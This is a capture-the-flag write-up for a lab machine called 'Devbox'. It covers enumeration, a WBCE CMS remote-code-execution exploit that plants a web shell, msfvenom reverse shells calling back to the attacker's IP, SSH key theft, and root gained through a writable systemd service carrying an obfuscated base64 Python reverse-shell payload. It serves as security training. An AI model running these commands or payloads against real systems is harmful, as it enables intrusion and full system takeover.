+++
title = 'SimplyCyber CTF - Devbox'
date = 2024-11-13T10:53:41-06:00
tags = ['Writeups', 'Cyber', 'Try Hack Me']
categories = ['Writeups', 'Cyber']
#weight = 1
+++

In this write-up, I’ll be sharing my process for completing the **Devbox** CTF challenge, which focused on local file inclusion (LFI) vulnerabilities and required careful exploration of the system’s misconfigurations to retrieve four flags. Initially, I didn’t plan to document my journey, but after completing the challenge, I wanted to share my process with the community.

---

## Background

The Devbox CTF task involved identifying and exploiting vulnerabilities in a misconfigured system. The goal was to extract four flags, each located in different parts of the system, by leveraging command-line tools, web enumeration, and privilege escalation techniques.

---

## Step 1: Initial Enumeration with Nmap

I began by scanning the target machine to find open ports and identify potential services:

```bash
$ sudo nmap -sS -p- -T5 10.10.214.82
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 13:34 CST
Warning: 10.10.214.82 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.214.82
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 234.68 seconds
```

This revealed two open ports:
- **Port 80**: This port hosted a website that displayed a maintenance page.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133220.png)

- **Port 8080**: This port hosted a “Self-Debugger” page, seemingly for a Python application.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133318.png)

- **Port 22**: SSH Server

With these results, I proceeded to investigate each of the ports further.

---

## Step 2: Enumerating Port 80 with Gobuster and Robots.txt

Since port 80 displayed a basic maintenance page, I ran `gobuster` to find hidden directories:

```bash
gobuster dir -u http://10.10.214.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

While `gobuster` was running, I checked `robots.txt` for any disallowed paths:

```
http://10.10.214.82/robots.txt
```

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133525.png)

This pointed to a `notes` path:

```
http://10.10.214.82/notes
```

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113133632.png)

Opening this path revealed **Admin credentials** and the first flag.

Finally gobuster reveal interesting pages like `notes` and `admin`

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134120.png)

---

## Step 3: Accessing the CMS Admin Panel

Investigating the `admin` path reveal a CMS application.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134341.png)

With the credentials from `notes`, I tried accessing the admin panel at:

```
http://10.10.214.82/admin
```

Upon successful login, I identified the CMS as **WBCE CMS v1.6.2**. I inspected the CMS and found a file upload feature that allowed users to upload media files to the server.

---

## Step 4: Exploiting WBCE CMS for Remote Code Execution

Searching for vulnerabilities in WBCE CMS, I found an exploit for **Remote Code Execution (RCE)** on Exploit-DB ([WBCE CMS v1.6.2 - RCE](https://www.exploit-db.com/exploits/52039)).

After downloading and modifying the script to fix indentation errors, I executed it:

```bash
python wbce-cms-exploit.py http://10.10.214.82 admin 123456
```

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134749.png)

The exploit successfully created a web shell located at `http://10.10.214.82/media/shell.inc`. I confirmed access by running a `id` command, which return the user running this application:

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113134839.png)

---

## Step 5: Upgrading to a Reverse Shell

To gain a more interactive shell, I generated a reverse shell payload with `msfvenom`:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.6.10.13 LPORT=4242 -f elf > reverse.elf
```

With `msfconsole` set up on my local machine, I configured it to listen for connections on port 4242:

```bash
msfconsole -q
use exploit/multi/handler
set LHOST 10.6.10.13
set LPORT 4242
set payload linux/x86/meterpreter/reverse_tcp
exploit
```

Now I could upload  `reverse.elf` to the machine.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135109.png)

After uploading this file via the CMS’s media tool, I executed `chmod +x reverse.elf` and `/reverse.elf` on the web shell:

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135241.png)

I successfully established a Meterpreter session, gaining more control over the environment.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135622.png)

I look into `home` directory, looking for users and found the second flag on the developer home directory

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113135954.png)

---

## Step 6: Investigating SSH Keys in Developer Home Directory

In the `/home/developer/git_keys` directory, I found a folder containing SSH keys. 

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113140201.png)

I downloaded `id_ecdsa` to my machine using Meterpreter’s `download` command:

```bash
download id_ecdsa
```

I then tested SSH access for all users, beginning with `developer`, and finally succeeded as `gitolite3` but it didn't gave a shell:

```bash
ssh -i id_ecdsa gitolite3@10.10.214.82
```

However it looks like gitolite3 is some kind of application that can respond to ssh.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113140458.png)

What is gitolite3?

From the [documentation](https://gitolite.com/gitolite/index.html)
```
Gitolite allows you to setup git hosting on a central server, with fine-grained access control and many more powerful features.
```

This granted access to the **gitolite3** account, which allowed me to view and clone Git repositories on the server.

```sh
ssh-add id_ecdsa
git clone gitolite3@10.10.135.183:debugger_app
git clone gitolite3@10.10.135.183:testing
```

---

## Step 7: Examining the Debugger Application Repository

One of the repositories, named `debugger_app`, contained source code for a Flask-based debugging application. Reviewing the code, I found that the application checked for a cookie `debugger_cookie` with a hardcoded value:

```python
HARDCODED_COOKIE_VALUE = "PLACEHOLDER"
```

To find the original value, I examined the Git history with:

```bash
git log
```

This revealed an earlier commit `d3e6adf` where the value was different. I reverted to that commit to view the code:

```bash
git reset --hard d3e6adf
```

The cookie value was:

```python
HARDCODED_COOKIE_VALUE = "r3m0t3d3bugg3r!"
```

Using a browser cookie editor, I set this cookie for `http://10.10.91.197:8080` and accessed the debugger interface.

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113140951.png)

At this time, I found the third flag under the Debugger home directory. And used the `cat` to retrieve it from the webshell. 

---

## Step 8: Privilege Escalation to Root

As `developer`, I reviewed sudo permissions with:

```bash
sudo -l
```

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141218.png)

I could run the following commands:
```
systemctl restart debugger
systemctl daemon-reload
```

I checked the `debugger.service` file:

```bash
$ ls -l /etc/systemd/system/multi-user.target.wants/debugger.service
lrwxrwxrwx 1 root root 36 Oct 20 18:05 /etc/systemd/system/multi-user.target.wants/debugger.service -> /lib/systemd/system/debugger.service

$ cat /etc/systemd/system/multi-user.target.wants/debugger.service
```

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141308.png)

Since the service file was writable, I modified it to execute a reverse shell as root. I created a Python reverse shell payload with `msfvenom`:

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.6.10.13 LPORT=4444 -f raw > shell.py
```

After replacing the `User` to root and `ExecStart` line in `debugger.service` , the file looked like this:

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141627.png)

```
[Unit]
Description=Debugger service
After=network-online.target

[Service]
User=root
ExecStart=/usr/bin/python3 -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqVkDsLwjAQgP9KyJSCpA/FRTIUqSCigu1ebIy0WHOhl/5/W9vokKk33PO7B9e8DXSWIMiXsuQrK4J9ZTqQCtFlYPYI2TmnBrSCxhHf8kHFa+oR42SxGcSroJgW8smwOUoP5fGSFb8zpmx+3Z/KvLhl6TnwJ3EJWitpGRsPcq3j6sCnAfmjNwlD/mxapYEFriFaAsdL4MSHjfh/mMt72zIaVo0OsabBB3yBYJ4=')[0])))"
RestartSec=1
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

With `nc` set to listen on port 4444,:

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141941.png)

I reloaded and restarted the service from the webshell:

```bash
sudo systemctl daemon-reload
sudo systemctl restart debugger
```

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113141756.png)

This successfully spawned a root reverse shell, and navigating to the `/root` directory, I found the final flag:

![](/post/2024/CTF-Devbox/images/Pasted%20image%2020241113142016.png)

---

## Conclusion

Devbox provided a rewarding mix of enumeration, persistence, and privilege escalation. Each flag required careful attention to detail and persistence. Thanks for following along, and if you have any tips or feedback, feel free to reach out!
